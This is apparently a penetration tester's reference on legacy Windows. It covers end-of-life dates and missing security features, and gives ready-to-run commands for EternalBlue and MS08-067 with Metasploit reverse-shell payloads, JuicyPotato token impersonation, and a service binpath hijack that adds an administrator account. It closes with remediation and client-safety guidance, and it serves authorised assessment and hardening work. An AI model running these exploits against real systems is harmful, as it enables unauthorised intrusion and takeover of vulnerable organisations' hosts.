## Legacy Operating Systems

Legacy Windows systems are a persistent reality during assessments, particularly against large organisations in healthcare, local government, utilities, and education. They matter not just because of unpatched kernel exploits, but because entire security features present in modern Windows simply do not exist on them. 

***

## EOL Reference

| Version | EOL Date | Key Risk |
|---|---|---|
| Windows XP | April 2014 | MS08-067, no DEP/ASLR by default |
| Windows Server 2003/R2 | April 2014 / July 2015 | MS08-067, no UAC, weak ACLs |
| Windows 7 | January 2020 | EternalBlue (MS17-010), weak token handling |
| Windows Server 2008/R2 | January 2020 | EternalBlue, MS11-046, Zerologon if DC |
| Windows Server 2012/R2 | October 2023 | Potato exploits, MS16-075 |
| Windows Server 2008 (ESU) | January 2026 | All ESU ended Jan 13 2026, now fully unpatched   |
***

## Key Security Features Missing in Legacy OS

Understanding what does not exist on older systems explains why privilege escalation is far simpler. 

| Security Feature | XP/2003 | Vista/7/2008 | Win 10/2016+ |
|---|---|---|---|
| UAC | No | Yes (weak) | Yes (improved) |
| ASLR | No | Partial | Full |
| DEP (NX) | Partial | Yes | Yes |
| SMEP/SMAP | No | No | Yes |
| Credential Guard | No | No | Yes |
| Protected Users group | No | No | Yes |
| SMBv1 default off | No | No | Yes (1903+) |
| PowerShell Constrained Language Mode | No | No | Optional |
| WDAC/AppLocker | No | AppLocker only | Both |

***

## High-Value Legacy Exploits

### EternalBlue (MS17-010) - SMBv1 RCE

Affects Windows 7, Server 2008/2008 R2, Server 2003, XP with SMBv1 enabled. Leaked NSA tool, used in WannaCry. Gives direct SYSTEM access without any prior credentials. 

```bash
# Step 1: Confirm target is vulnerable
nmap -p 445 --script smb-vuln-ms17-010 <target>
# Output: VULNERABLE: Remote Code Execution vulnerability in Microsoft SMBv1 servers

# Step 2: Exploit with Metasploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > set RHOSTS 10.129.43.30
msf6 > set LHOST 10.10.14.3
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > exploit
# Result: meterpreter > getuid -> Server username: NT AUTHORITY\SYSTEM

# Step 3: Manual exploit (Python, no Metasploit)
git clone https://github.com/worawit/MS17-010
python checker.py <target>        # verify named pipes accessible
python zzz_exploit.py <target>    # fire exploit with custom shellcode

# Confirm SMBv1 is running (required for EternalBlue)
nmap -p 445 --script smb-protocols <target>
# Look for: SMBv1 dialect supported
```

### MS08-067 - NetAPI RCE (XP/Server 2003)

```bash
# Check vulnerability
nmap -p 445 --script smb-vuln-ms08-067 <target>

# Metasploit
msf6 > use exploit/windows/smb/ms08_067_netapi
msf6 > set RHOSTS <target>
msf6 > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 > set TARGET 1    # 1=Windows XP SP3, check 'show targets' for full list
msf6 > exploit
```

***

## Legacy-Specific Local Privilege Escalation

### Token Impersonation (Pre-Win 10)

Legacy systems do not have the same restrictions on token impersonation. SeImpersonatePrivilege is far more exploitable because kernel mitigations are absent. 

```powershell
# Check impersonation privileges (Potato attacks work better on legacy)
whoami /priv
# SeImpersonatePrivilege Enabled -> Potato attacks applicable

# Hot Potato (Windows 7/Server 2008) - combines NBNS spoofing + NTLM relay + token impersonation
# Rotten Potato - works against Windows 7 and older
# JuicyPotato - works up to Server 2016 (not 2019+)

# JuicyPotato on Windows 7/2008 - pick any working CLSID for that OS version
# https://github.com/ohpe/juicy-potato/tree/master/CLSID
.\JuicyPotato.exe -l 9999 -p cmd.exe -t * -c "{CLSID for target OS}"

# PrintSpoofer does NOT work on legacy OS - use JuicyPotato instead
# GodPotato works on Server 2012 through 2022 only
```

### Weak Service Permissions (More Common on Legacy)

Legacy systems installed with default settings frequently have weak ACLs on service binaries and config folders. 
```cmd
:: accesschk was essential before icacls existed
accesschk.exe /accepteula -uwcqv "Authenticated Users" * 2>nul
accesschk.exe /accepteula -uwcqv "Everyone" * 2>nul
:: Look for RW SSDPSRV, upnphost, etc.

:: These are common on XP SP0-SP1 with no patches
sc config upnphost binpath= "net localgroup administrators hacker /add"
sc stop upnphost
sc start upnphost
```

### Local Exploit Suggester (Metasploit Post Module)

When you have a Meterpreter session on a legacy OS, this is the fastest way to find applicable kernel exploits: 

```
msf6 > use post/multi/recon/local_exploit_suggester
msf6 > set SESSION 1
msf6 > run

# Common findings on Windows 7/Server 2008:
# exploit/windows/local/ms16_014_wmi_recv_notif
# exploit/windows/local/ms16_075_reflection
# exploit/windows/local/ms13_053_schlamperei
# exploit/windows/local/ms10_015_kitrap0d      <- Windows 7 very common
# exploit/windows/local/ms11_046_afd_apc_uaf   <- Server 2008 R2 very common
```

***

## Enumeration Differences on Legacy Systems

```cmd
:: Legacy tools (PowerShell limited or absent on XP/2003)
:: Use cmd.exe equivalents

:: List users (XP/2003)
net user
net localgroup administrators

:: List running services
sc query state= all
tasklist /svc

:: Check patches applied
wmic qfe get Caption,Description,HotFixID,InstalledOn
:: Missing patches = cross-reference with MS bulletin numbers

:: System info for vulnerability mapping
systeminfo
:: Feed output to Windows-Exploit-Suggester
python2 windows-exploit-suggester.py --database 2024-01-01-mssb.xls --systeminfo sysinfo.txt

:: Check SMBv1 status (Server 2008)
sc query mrxsmb10
:: Running = SMBv1 enabled = potentially vulnerable to EternalBlue
```

```powershell
# Disable SMBv1 (remediation recommendation for client report)
Set-SmbServerConfiguration -EnableSMB1Protocol $false -Force

# Verify
Get-SmbServerConfiguration | Select-Object EnableSMB1Protocol
```

***

## Legacy Assessment Workflow

```
1. OS fingerprint: systeminfo or nmap -O
         |
         v
2. Check for remote exploits FIRST (EternalBlue, MS08-067)
   nmap -p 445 --script smb-vuln-ms17-010,smb-vuln-ms08-067 <target>
         |
         v
3. If already on box, run local_exploit_suggester or windows-exploit-suggester
   Feed systeminfo + missing patches to suggester tool
         |
         v
4. Check SeImpersonatePrivilege -> JuicyPotato (pre-2019)
         |
         v
5. Check weak service ACLs with accesschk (more common on unpatched legacy)
   accesschk.exe -uwcqv "Authenticated Users" *
         |
         v
6. Check unquoted service paths (no fix for this on any OS)
         |
         v
7. Check AlwaysInstallElevated, Autologon registry values
         |
         v
8. Document fragile hosts - confirm with client before running
   anything that could cause instability (kernel exploits, service restarts)
```

***

## Engagement Considerations for Legacy Systems

Legacy hosts running mission-critical applications require extra caution during testing. 

```
Before running any exploit against a legacy host:

1. Ask client: "Is this running any critical applications?"
2. Run exploits during maintenance windows if possible
3. Prefer read-only reconnaissance over destructive exploits
4. Document the vulnerability with evidence (systeminfo + vuln check output)
   rather than full exploitation if the system is identified as fragile
5. Recommend network segmentation as immediate mitigation:
   - Isolate on dedicated VLAN
   - Block SMB (445) inbound from all except required admin hosts
   - Block NetBIOS (137-139) entirely
   - Restrict to specific source IPs via host-based firewall
6. Long-term recommendation: upgrade or retire
   Virtualize the application if OS must stay legacy
```
